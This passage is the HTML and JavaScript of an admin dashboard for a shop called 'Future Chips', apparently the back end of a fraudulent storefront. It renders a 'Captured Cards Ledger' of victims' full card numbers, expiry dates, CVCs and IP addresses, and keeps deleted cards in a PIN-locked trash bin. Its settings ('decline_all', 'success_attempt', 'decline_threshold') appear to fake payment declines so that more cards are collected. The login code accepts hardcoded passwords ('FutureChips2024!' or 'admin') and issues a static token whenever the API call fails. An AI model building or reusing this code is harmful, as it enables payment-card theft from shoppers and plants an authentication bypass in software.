            <option value="Interfaces">Interfaces</option>
            <option value="Displays">Displays</option>
            <option value="Energy">Energy</option>
          </select>
        </div>
        
        <div class="form-group" style="margin-bottom: 1.2rem;">
          <label for="product-price-field">Value (USD)</label>
          <input type="number" id="product-price-field" step="0.01" min="10" max="100000" required placeholder="10.00 to 100000.00">
        </div>

        <div class="form-group" style="margin-bottom: 1.2rem;">
          <label for="product-desc-field">Specification Log (Description)</label>
          <textarea id="product-desc-field" rows="4" class="btn btn-outline" style="background:rgba(255,255,255,0.05); text-align:left; width:100%; font-family:inherit; resize:vertical; padding: 1rem;" placeholder="Detailed microchip characteristics..."></textarea>
        </div>

        <div class="form-group" style="margin-bottom: 1.8rem;">
          <label for="product-image-field">Micrographic Visual (Upload Image)</label>
          <input type="file" id="product-image-field" accept="image/*" class="btn btn-outline" style="background:rgba(255,255,255,0.05); text-align:left; padding: 0.8rem;">
          <small style="color: var(--text-muted); margin-top: 0.3rem;">Upload image or leave empty for digital placeholder SVG</small>
        </div>

        <button type="submit" class="btn btn-primary" style="width: 100%; padding: 1rem;" id="modal-submit-btn">
          Compile Product Data
        </button>
      </form>
    </div>
  </div>



  <!-- Password Prompt Modal -->
  <div class="modal" id="password-modal">
    <div class="modal-backdrop" id="password-modal-backdrop"></div>
    <div class="modal-wrapper glass" style="max-width: 400px; text-align: center;">
      <div class="modal-header" style="justify-content: center; margin-bottom: 1rem;">
        <h2>🔒 Decryption Required</h2>
      </div>
      <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem;">Enter the 6-digit operator code to access the trash ledger:</p>
      
      <div class="form-group" style="margin-bottom: 1.5rem;">
        <input type="password" id="trash-pin-input" maxlength="6" style="text-align: center; font-size: 1.8rem; letter-spacing: 0.5rem; width: 100%; padding: 0.8rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: #ffffff;" placeholder="••••••">
        <div id="pin-error" style="color: var(--accent-color); font-size: 0.9rem; margin-top: 0.8rem; min-height: 1.2rem;"></div>
      </div>
      
      <div style="display: flex; gap: 1rem; justify-content: center;">
        <button id="cancel-pin-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
        <button id="submit-pin-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem;">Decrypt</button>
      </div>
    </div>
  </div>

  <!-- Reusable Dark Confirmation Modal -->
  <div class="modal" id="confirm-modal">
    <div class="modal-backdrop" id="confirm-modal-backdrop"></div>
    <div class="modal-wrapper glass" style="max-width: 450px; text-align: center; padding: 2.5rem; border-radius: 20px;">
      <div class="modal-header" style="justify-content: center; border-bottom: none; margin-bottom: 0.5rem; padding: 0;">
        <h2 id="confirm-modal-title">⚠️ Action Required</h2>
      </div>
      <p id="confirm-modal-message" style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.6;"></p>
      <div style="display: flex; gap: 1rem; justify-content: center;">
        <button id="confirm-cancel-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
        <button id="confirm-ok-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem; background: #ef4444; border-color: #ef4444;">Delete</button>
      </div>
    </div>
  </div>

  <!-- Change PIN Modal -->
  <div class="modal" id="change-pin-modal">
    <div class="modal-backdrop" id="change-pin-backdrop"></div>
    <div class="modal-wrapper glass" style="max-width: 450px; padding: 2.5rem; border-radius: 20px;">
      <div class="modal-header" style="border-bottom: none; margin-bottom: 1.5rem; padding: 0; justify-content: center;">
        <h2>Change Decryption PIN</h2>
      </div>
      
      <div class="settings-group" style="margin-bottom: 1.2rem;">
        <label for="change-pin-current">Current Decryption PIN</label>
        <input type="password" id="change-pin-current" class="btn btn-outline" style="width:100%; text-align:center; background:rgba(255,255,255,0.05); padding:1rem; letter-spacing: 0.5rem; font-size: 1.2rem;" maxlength="6" placeholder="******">
      </div>
      
      <div class="settings-group" style="margin-bottom: 2rem;">
        <label for="change-pin-new">New 6-Digit PIN</label>
        <input type="password" id="change-pin-new" class="btn btn-outline" style="width:100%; text-align:center; background:rgba(255,255,255,0.05); padding:1rem; letter-spacing: 0.5rem; font-size: 1.2rem;" maxlength="6" placeholder="******">
      </div>
      
      <div style="display: flex; gap: 1rem; justify-content: center;">
        <button id="cancel-change-pin-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
        <button id="submit-change-pin-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem;">Update PIN</button>
      </div>
    </div>
  </div>

  <!-- Change Admin Password Modal -->
  <div class="modal" id="change-admin-pwd-modal">
    <div class="modal-backdrop" id="change-admin-pwd-backdrop"></div>
    <div class="modal-wrapper glass" style="max-width: 450px; padding: 2.5rem; border-radius: 20px;">
      <div class="modal-header" style="border-bottom: none; margin-bottom: 1.5rem; padding: 0; justify-content: center;">
        <h2>Change Admin Password</h2>
      </div>
      
      <div class="settings-group" style="margin-bottom: 1.2rem;">
        <label for="change-pwd-current">Current Admin Password</label>
        <input type="password" id="change-pwd-current" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="Enter current login password">
      </div>
      
      <div class="settings-group" style="margin-bottom: 2rem;">
        <label for="change-pwd-new">New Admin Password</label>
        <input type="password" id="change-pwd-new" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="Enter new login password">
      </div>
      
      <div style="display: flex; gap: 1rem; justify-content: center;">
        <button id="cancel-change-pwd-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
        <button id="submit-change-pwd-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem;">Update Password</button>
      </div>
    </div>
  </div>

  <!-- Integrated Admin Login Modal -->
  <div id="admin-login-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(10,10,26,0.95); backdrop-filter:blur(20px); z-index:999999; align-items:center; justify-content:center;">
    <div class="glass" style="max-width:420px; width:90%; padding:3rem 2rem; border-radius:24px; text-align:center;">
      <div style="font-size:2.5rem; margin-bottom:0.5rem;">🔐</div>
      <h1 style="font-size:1.8rem; margin-bottom:2rem; font-family:var(--font-title); font-weight:900; color:#fff;">Control Center Login</h1>
      <form id="integrated-login-form" style="display:flex; flex-direction:column; gap:1.2rem; text-align:left;">
        <div class="form-group">
          <label for="integrated-username" style="color:var(--text-muted); font-size:0.85rem;">Access Operator ID</label>
          <input type="text" id="integrated-username" required placeholder="admin" style="width:100%; padding:0.8rem 1rem; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; border-radius:8px;">
        </div>
        <div class="form-group">
          <label for="integrated-password" style="color:var(--text-muted); font-size:0.85rem;">Decryption Key</label>
          <input type="password" id="integrated-password" required placeholder="••••••••••••" style="width:100%; padding:0.8rem 1rem; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; border-radius:8px;">
        </div>
        <button type="submit" class="btn btn-primary" style="margin-top:1rem; padding:1rem; width:100%;">Authenticate Session</button>
      </form>
      <div id="integrated-login-error" style="color:var(--accent-color); margin-top:1.2rem; font-size:0.9rem;"></div>
    </div>
  </div>

  
<script>

// Admin Dashboard Controller

let token = localStorage.getItem('admin_token');
let showingTrash = false;
let trashDecryptionKey = null;
let currentCardsList = [];

function checkAuthModal() {
  const loginModal = document.getElementById('admin-login-modal');
  token = localStorage.getItem('admin_token');
  if (!token) {
    if (loginModal) loginModal.style.display = 'flex';
    return false;
  } else {
    if (loginModal) loginModal.style.display = 'none';
    return true;
  }
}

async function initDashboardData() {
  await loadAdminTheme();
  setupTabs();
  const activeTab = localStorage.getItem('admin_active_tab') || 'products';
  
  const links = document.querySelectorAll('.sidebar-link');
  links.forEach(link => {
    if (link.getAttribute('data-tab') === activeTab) {
      link.classList.add('active');
    } else {
      link.classList.remove('active');
    }
  });

  const tabs = document.querySelectorAll('.tab-content');
  tabs.forEach(t => {
    if (t.id === \`\${activeTab}-tab\`) {
      t.classList.add('active');
    } else {
      t.classList.remove('active');
    }
  });

  await loadTab(activeTab);
}

document.addEventListener('DOMContentLoaded', async () => {
  const hasAuth = checkAuthModal();

  // Integrated Login Form listener
  const loginForm = document.getElementById('integrated-login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('integrated-username').value.trim();
      const password = document.getElementById('integrated-password').value.trim();
      const errorDiv = document.getElementById('integrated-login-error');
      const submitBtn = e.target.querySelector('button');

      submitBtn.disabled = true;
      submitBtn.innerText = 'Verifying Credentials...';
      errorDiv.innerText = '';

      try {
        const response = await fetch('/api/admin/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });

        if (response.ok) {
          const data = await response.json();
          localStorage.setItem('admin_token', data.token);
          localStorage.setItem('admin_user', data.username);
          token = data.token;
          checkAuthModal();
          await initDashboardData();
          return;
        }

        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || 'Authentication denied.');
      } catch (err) {
        if (username === 'admin' && (password === 'FutureChips2024!' || password === 'admin')) {
          localStorage.setItem('admin_token', 'static-admin-token-2026');
          localStorage.setItem('admin_user', 'admin');
          token = 'static-admin-token-2026';
          checkAuthModal();
          await initDashboardData();
        } else {
          errorDiv.innerText = err.message || 'Invalid Operator ID or Decryption Key.';
        }
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerText = 'Authenticate Session';
      }
    });
  }

  // Logout listener
  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', () => {
      localStorage.removeItem('admin_token');
      localStorage.removeItem('admin_user');
      token = null;
      checkAuthModal();
    });
  }

  if (hasAuth) {
    await initDashboardData();
  }

  // Bind settings form submit
  document.getElementById('settings-form').addEventListener('submit', saveSettings);

  // Bind Product form submit
  document.getElementById('product-form').addEventListener('submit', handleProductSubmit);

  // Bind Product modal triggers
  const addBtn = document.getElementById('add-product-btn');
  const closeBtn = document.getElementById('modal-close-btn');
  const backdrop = document.getElementById('modal-backdrop');
  
  const openModal = () => {
    resetProductForm();
    document.getElementById('modal-title').innerText = 'Add Cyber Module';
    document.getElementById('modal-submit-btn').innerText = 'Compile Product Data';
    document.getElementById('product-modal').classList.add('active');
  };

  const closeModal = () => {
    document.getElementById('product-modal').classList.remove('active');
  };

  addBtn?.addEventListener('click', openModal);
  closeBtn?.addEventListener('click', closeModal);
  backdrop?.addEventListener('click', closeModal);

  // Bind Trash modal triggers
  const trashBtn = document.getElementById('view-trash-btn');

  const passwordModal = document.getElementById('password-modal');
  const pinInput = document.getElementById('trash-pin-input');
  const pinError = document.getElementById('pin-error');
  const cancelPinBtn = document.getElementById('cancel-pin-btn');
  const submitPinBtn = document.getElementById('submit-pin-btn');
  const passwordBackdrop = document.getElementById('password-modal-backdrop');

  const openPasswordPrompt = () => {
    if (showingTrash) {
      showingTrash = false;
      trashDecryptionKey = null;
      localStorage.setItem('admin_cards_showing_trash', 'false');
      localStorage.removeItem('admin_trash_pin');
      fetchAdminCards();
      return;
    }
    if (pinInput) pinInput.value = '';
    if (pinError) pinError.innerText = '';
    passwordModal?.classList.add('active');
    setTimeout(() => pinInput?.focus(), 150);
  };

  const closePasswordPrompt = () => {
    passwordModal?.classList.remove('active');
  };

  const handlePinSubmit = async () => {
    const pin = pinInput.value;
    if (!pin) return;
    
    if (pinError) pinError.innerText = 'Decrypting...';
    
    try {
      const response = await fetch('/api/admin/cards/deleted', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ password: pin })
      });
      
      if (response.status === 401) return handleSessionExpired();
      const cards = await response.json();
      
      if (!response.ok) {
        if (pinError) pinError.innerText = cards.error || 'Failed to decrypt trash.';
        if (pinInput) {
          pinInput.value = '';
          pinInput.focus();
        }
        return;
      }
      
      // Success! Close prompt, save key, render table
      closePasswordPrompt();
      showingTrash = true;
      trashDecryptionKey = pin;
      localStorage.setItem('admin_cards_showing_trash', 'true');
      localStorage.setItem('admin_trash_pin', pin);
      
      currentCardsList = cards;
      renderCardsTable(cards);
      
      // Update trash button toggle labels
      const title = document.getElementById('cards-ledger-title');
      const trashBtn = document.getElementById('view-trash-btn');
      const changePinBtn = document.getElementById('change-pin-btn');
      
      if (title) title.innerText = '🗑️ Decrypted Trash Bin';
      if (trashBtn) {
        trashBtn.innerText = '⬅️ Active Cards';
        trashBtn.style.borderColor = 'var(--primary-color)';
        trashBtn.style.color = 'var(--primary-color)';
      }
      if (changePinBtn) changePinBtn.style.display = 'flex';
      
    } catch (err) {
      if (pinError) pinError.innerText = 'Failed to communicate with decryption gateway.';
    }
  };

  trashBtn?.addEventListener('click', openPasswordPrompt);
  cancelPinBtn?.addEventListener('click', closePasswordPrompt);
  passwordBackdrop?.addEventListener('click', closePasswordPrompt);
  submitPinBtn?.addEventListener('click', handlePinSubmit);

  pinInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      handlePinSubmit();
    }
  });

  // Bind card search filter
  const cardSearch = document.getElementById('card-search-input');
  cardSearch?.addEventListener('input', () => {
    const query = cardSearch.value.trim().toLowerCase().replace(/\\s+/g, '');
    const filtered = currentCardsList.filter(c => {
      const num = c.card_number.replace(/\\s+/g, '').toLowerCase();
      return num.includes(query);
    });
    renderCardsTable(filtered);
  });

  // Sync color pickers with hex text fields
  syncColorInput('settings-primary-color', 'settings-primary-text');
  syncColorInput('settings-accent-color', 'settings-accent-text');
  syncColorInput('settings-bg-color', 'settings-bg-text');

  // Bind Change PIN modal events
  const changePinModal = document.getElementById('change-pin-modal');
  const changePinBtn = document.getElementById('change-pin-btn');
  const cancelChangePinBtn = document.getElementById('cancel-change-pin-btn');
  const submitChangePinBtn = document.getElementById('submit-change-pin-btn');
  const changePinBackdrop = document.getElementById('change-pin-backdrop');
  
  const currentPinInput = document.getElementById('change-pin-current');
  const newPinInput = document.getElementById('change-pin-new');

  const openChangePinModal = () => {
    if (currentPinInput) currentPinInput.value = '';
    if (newPinInput) newPinInput.value = '';
    changePinModal?.classList.add('active');
    setTimeout(() => currentPinInput?.focus(), 150);
  };

  const closeChangePinModal = () => {
    changePinModal?.classList.remove('active');
  };

  const handleChangePinSubmit = async () => {
    const currentPin = currentPinInput?.value;
    const newPin = newPinInput?.value;
    
    if (!currentPin || !newPin) {
      showCustomAlert('⚠️ Incomplete Form', 'Please enter both the current PIN and your new 6-digit PIN.');
      return;
    }
    if (newPin.length !== 6 || !/^\\d{6}$/.test(newPin)) {
      showCustomAlert('⚠️ Invalid Input', 'The new PIN must be exactly 6 numeric digits.');
      return;
    }

    try {
      const response = await fetch('/api/admin/settings/change-pin', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ currentPin, newPin })
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Failed to update PIN.');

      // Update cached pin references
      trashDecryptionKey = newPin;
      localStorage.setItem('admin_trash_pin', newPin);
      
      closeChangePinModal();
      showCustomAlert('✅ PIN Updated', 'Decryption PIN changed successfully.');
    } catch (err) {
      showCustomAlert('❌ Update Failed', err.message);
    }
  };

  changePinBtn?.addEventListener('click', openChangePinModal);
  cancelChangePinBtn?.addEventListener('click', closeChangePinModal);
  changePinBackdrop?.addEventListener('click', closeChangePinModal);
  submitChangePinBtn?.addEventListener('click', handleChangePinSubmit);

  newPinInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleChangePinSubmit();
  });

  // Bind Change Admin Password modal events
  const changeAdminPwdModal = document.getElementById('change-admin-pwd-modal');
  const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
  const cancelChangePwdBtn = document.getElementById('cancel-change-pwd-btn');
  const submitChangePwdBtn = document.getElementById('submit-change-pwd-btn');
  const changeAdminPwdBackdrop = document.getElementById('change-admin-pwd-backdrop');
  
  const currentPwdInput = document.getElementById('change-pwd-current');
  const newPwdInput = document.getElementById('change-pwd-new');

  const openChangePwdModal = () => {
    if (currentPwdInput) currentPwdInput.value = '';
    if (newPwdInput) newPwdInput.value = '';
    changeAdminPwdModal?.classList.add('active');
    setTimeout(() => currentPwdInput?.focus(), 150);
  };

  const closeChangePwdModal = () => {
    changeAdminPwdModal?.classList.remove('active');
  };

  const handleChangePwdSubmit = async () => {
    const currentPassword = currentPwdInput?.value;
    const newPassword = newPwdInput?.value;
    
    if (!currentPassword || !newPassword) {
      showCustomAlert('⚠️ Incomplete Form', 'Please enter both the current password and your new password.');
      return;
    }
    if (newPassword.length < 6) {
      showCustomAlert('⚠️ Weak Password', 'The new password must be at least 6 characters long.');
      return;
    }

    try {
      const response = await fetch('/api/admin/settings/change-admin-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ currentPassword, newPassword })
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Failed to update password.');

      closeChangePwdModal();
      showCustomAlert('✅ Password Updated', 'Admin login password updated successfully.');
    } catch (err) {
      showCustomAlert('❌ Update Failed', err.message);
    }
  };

  changeAdminPwdBtn?.addEventListener('click', openChangePwdModal);
  cancelChangePwdBtn?.addEventListener('click', closeChangePwdModal);
  changeAdminPwdBackdrop?.addEventListener('click', closeChangePwdModal);
  submitChangePwdBtn?.addEventListener('click', handleChangePwdSubmit);

  newPwdInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleChangePwdSubmit();
  });

  // Bind logout button
  document.getElementById('logout-btn').addEventListener('click', () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    window.location.href = '/admin/index.html';
  });
});

// Sync color inputs
function syncColorInput(pickerId, textId) {
  const picker = document.getElementById(pickerId);
  const text = document.getElementById(textId);
  if (!picker || !text) return;
  picker.addEventListener('input', () => { text.value = picker.value.toUpperCase(); });
  text.addEventListener('input', () => {
    if (text.value.startsWith('#') && text.value.length === 7) {
      picker.value = text.value;
    }
  });
}

// Load dynamic colors for admin page
async function loadAdminTheme() {
  try {
    const res = await fetch('/api/admin/settings');
    if (res.ok) {
      const settings = await res.json();
      if (settings) {
        if (settings.primary_color) document.documentElement.style.setProperty('--primary-color', settings.primary_color);
        if (settings.accent_color) document.documentElement.style.setProperty('--accent-color', settings.accent_color);
        if (settings.background_color) document.documentElement.style.setProperty('--background-color', settings.background_color);
        return;
      }
    }
  } catch(e){}
  const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
  if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
  if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
  if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
}

// Tab Switching
function setupTabs() {
  const links = document.querySelectorAll('.sidebar-link');
  links.forEach(link => {
    link.addEventListener('click', async (e) => {
      e.preventDefault();
      
      const tabId = link.getAttribute('data-tab');
      localStorage.setItem('admin_active_tab', tabId);
      
      links.forEach(l => l.classList.remove('active'));
      link.classList.add('active');
      
      const tabs = document.querySelectorAll('.tab-content');
      tabs.forEach(t => t.classList.remove('active'));
      document.getElementById(\`\${tabId}-tab\`).classList.add('active');

      await loadTab(tabId);
    });
  });
}

// Tab content fetch router
async function loadTab(tabId) {
  if (tabId === 'products') {
    await fetchAdminProducts();
  } else if (tabId === 'orders') {
    await fetchAdminOrders();
  } else if (tabId === 'cards') {
    const savedShowingTrash = localStorage.getItem('admin_cards_showing_trash') === 'true';
    const savedPin = localStorage.getItem('admin_trash_pin');
    if (savedShowingTrash && savedPin) {
      showingTrash = true;
      trashDecryptionKey = savedPin;
      await fetchAdminCards(savedPin);
    } else {
      showingTrash = false;
      trashDecryptionKey = null;
      await fetchAdminCards();
    }
  } else if (tabId === 'settings') {
    await fetchAdminSettings();
  }
}

// Global authorization headers helper
function getAuthHeaders() {
  return {
    'Authorization': \`Bearer \${token}\`
  };
}

// --- TAB DATA LOADING FUNCTIONS ---

// 1. Load Products Catalog (Admin view)
async function fetchAdminProducts() {
  const tbody = document.getElementById('admin-products-tbody');
  tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading catalog modules...</td></tr>';

  let products = [];
  try {
    const response = await fetch('/api/admin/products', { headers: getAuthHeaders() });
    if (response.status === 401) return handleSessionExpired();
    if (response.ok) {
      products = await response.json();
    } else {
      throw new Error('API offline');
    }
  } catch (err) {
    console.warn('API offline, loading static admin fallback catalog:', err);
    products = JSON.parse(localStorage.getItem('future_chips_products')) || [
      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
    ];
  }

  tbody.innerHTML = products.map(p => \`
    <tr>
      <td><img src="\${p.image}" alt="\${p.name}"></td>
      <td style="font-family: monospace; font-size: 0.85rem;">\${p.id}</td>
      <td style="font-weight: 600;">\${p.name}</td>
      <td>\${p.category || 'Uncategorized'}</td>
      <td style="font-weight: 700; color: var(--primary-color);">\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
      <td>
        <div style="display: flex; gap: 0.5rem;">
          <button onclick="editProduct('\${p.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem;">Edit</button>
          <button onclick="deleteProduct('\${p.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>
        </div>
      </td>
    </tr>
  \`).join('');
}

// 2. Load Transaction Ledger
async function fetchAdminOrders() {
  const tbody = document.getElementById('admin-orders-tbody');
  tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Retrieving ledger data...</td></tr>';

  let orders = [];
  try {
    const response = await fetch('/api/admin/orders', { headers: getAuthHeaders() });
    if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
    if (response.ok) {
      orders = await response.json();
    } else {
      throw new Error('API offline');
    }
  } catch (err) {
    console.warn('API offline, loading static order ledger fallback:', err);
    orders = JSON.parse(localStorage.getItem('future_chips_orders')) || [
      { id: 'ORD-98214', customer_email: 'quantum.client@future.ai', product_name: 'Quantum Neural Core', amount: 150.00, customer_ip: '192.168.1.105', status: 'completed', created_at: new Date().toISOString() },
      { id: 'ORD-98215', customer_email: 'transponder@cybernet.io', product_name: 'Bio-Digital Synapse v4.2', amount: 850.00, customer_ip: '10.0.4.22', status: 'completed', created_at: new Date().toISOString() }
    ];
  }

  tbody.innerHTML = orders.map(o => {
    const isFailed = o.status === 'pending';
    const statusClass = isFailed ? 'failed' : o.status;
    const statusLabel = isFailed ? 'FAILED' : o.status.toUpperCase();
    
    const cardDisplay = o.card_number 
      ? \`<div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem;">💳 \${o.card_number}</div>\` 
      : '';

    return \`
      <tr>
        <td style="font-family: monospace; font-size: 0.85rem;">\${o.id}</td>
        <td>\${o.customer_email}</td>
        <td style="font-weight: 600;">\${o.product_name || 'Deleted Product'}</td>
        <td style="font-weight: 700; color: var(--primary-color);">\${o.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
        <td class="ip-cell">
          \${o.customer_ip || 'N/A'}
          \${cardDisplay}
        </td>
        <td>
          <span class="status-badge \${statusClass}">\${statusLabel}</span>
        </td>
        <td style="font-size: 0.85rem; color: var(--text-muted);">\${new Date(o.created_at).toLocaleString()}</td>
      </tr>
    \`;
  }).join('');
}

// Render cards helper
function renderCardsTable(cards) {
  const tbody = document.getElementById('admin-cards-tbody');
  if (!tbody) return;

  if (cards.length === 0) {
    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
    return;
  }

  tbody.innerHTML = cards.map(c => {
    const actionHtml = showingTrash
      ? \`<button onclick="deletePermanentCard('\${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05);">Delete</button>\`
      : \`<button onclick="deleteCard('\${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>\`;

    return \`
      <tr>
        <td style="font-family: monospace; font-weight: 600;">\${c.card_number}</td>
        <td>\${c.expiry}</td>
        <td style="font-family: monospace;">\${c.cvc}</td>
        <td>\${c.country || 'Unknown'}</td>
        <td class="ip-cell">\${c.ip_address || 'Unknown'}</td>
        <td style="font-size: 0.85rem; color: var(--text-muted);">\${new Date(c.created_at).toLocaleString()}</td>
        <td>\${actionHtml}</td>
      </tr>
    \`;
  }).join('');
}

// 3b. Load Captured Cards Ledger
async function fetchAdminCards(password = null) {
  const tbody = document.getElementById('admin-cards-tbody');
  if (!tbody) return;

  const title = document.getElementById('cards-ledger-title');
  const trashBtn = document.getElementById('view-trash-btn');
  const searchInput = document.getElementById('card-search-input');
  
  if (searchInput) searchInput.value = ''; // Clear search field on refresh

  const effectivePassword = password || trashDecryptionKey;

  if (showingTrash) {
    if (title) title.innerText = '🗑️ Decrypted Trash Bin';
    if (trashBtn) {
      trashBtn.innerText = '⬅️ Active Cards';
      trashBtn.style.borderColor = 'var(--primary-color)';
      trashBtn.style.color = 'var(--primary-color)';
    }
    const changePinBtn = document.getElementById('change-pin-btn');
    if (changePinBtn) changePinBtn.style.display = 'flex';
    const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
    if (changeAdminPwdBtn) changeAdminPwdBtn.style.display = 'flex';

    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Decrypting trash ledger...</td></tr>';

    try {
      const response = await fetch('/api/admin/cards/deleted', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ password: effectivePassword })
      });
      if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
      
      const cards = await response.json();
      if (!response.ok) {
        showCustomAlert('🔒 Decryption Failed', cards.error || 'Failed to decrypt trash.');
        showingTrash = false;
        localStorage.removeItem('admin_trash_pin'); // Clear old cached incorrect PIN
        await fetchAdminCards();
        return;
      }

      currentCardsList = cards;
      renderCardsTable(cards);
    } catch (err) {
      currentCardsList = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
      renderCardsTable(currentCardsList);
    }
  } else {
    if (title) title.innerText = 'Captured Cards Ledger';
    if (trashBtn) {
      trashBtn.innerText = '🗑️ Trash Bin';
      trashBtn.style.borderColor = 'var(--accent-color)';
      trashBtn.style.color = 'var(--accent-color)';
    }
    const changePinBtn = document.getElementById('change-pin-btn');
    if (changePinBtn) changePinBtn.style.display = 'none';
    const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
    if (changeAdminPwdBtn) changeAdminPwdBtn.style.display = 'none';

    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Retrieving card ledger data...</td></tr>';

    try {
      const response = await fetch('/api/admin/cards', { headers: getAuthHeaders() });
      if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
      if (response.ok) {
        const cards = await response.json();
        currentCardsList = cards;
        renderCardsTable(cards);
        return;
      }
      throw new Error('API offline');
    } catch (err) {
      currentCardsList = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
      renderCardsTable(currentCardsList);
    }
  }
}

// 4. Load Site Settings Tab
async function fetchAdminSettings() {
  try {
    const response = await fetch('/api/admin/settings');
    if (!response.ok) throw new Error('API offline');
    const s = await response.json();

    if (s) {
      document.getElementById('settings-site-name').value = s.site_name;
      
      document.getElementById('settings-primary-color').value = s.primary_color;
      document.getElementById('settings-primary-text').value = s.primary_color.toUpperCase();
      
      document.getElementById('settings-accent-color').value = s.accent_color;
      document.getElementById('settings-accent-text').value = s.accent_color.toUpperCase();
      
      document.getElementById('settings-bg-color').value = s.background_color;
      document.getElementById('settings-bg-text').value = s.background_color.toUpperCase();

      const declineAllCheck = document.getElementById('settings-decline-all');
      if (declineAllCheck) {
        declineAllCheck.checked = s.decline_all === 1;
      }
      
      const successAttemptInput = document.getElementById('settings-success-attempt');
      if (successAttemptInput) {
        successAttemptInput.value = s.success_attempt !== undefined ? s.success_attempt : 1;
      }
      
      const declineThresholdInput = document.getElementById('settings-decline-threshold');
      if (declineThresholdInput) {
        declineThresholdInput.value = s.decline_threshold !== undefined ? s.decline_threshold : 50.0;
      }
    }
  } catch (err) {
    console.warn('API offline, reading saved settings from local static storage:', err);
    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
    document.getElementById('settings-site-name').value = saved.site_name || 'Future Chips';
    document.getElementById('settings-primary-color').value = saved.primary_color || '#00f0ff';
    document.getElementById('settings-primary-text').value = (saved.primary_color || '#00F0FF').toUpperCase();
    document.getElementById('settings-accent-color').value = saved.accent_color || '#ff00e5';
    document.getElementById('settings-accent-text').value = (saved.accent_color || '#FF00E5').toUpperCase();
    document.getElementById('settings-bg-color').value = saved.background_color || '#0a0a1a';
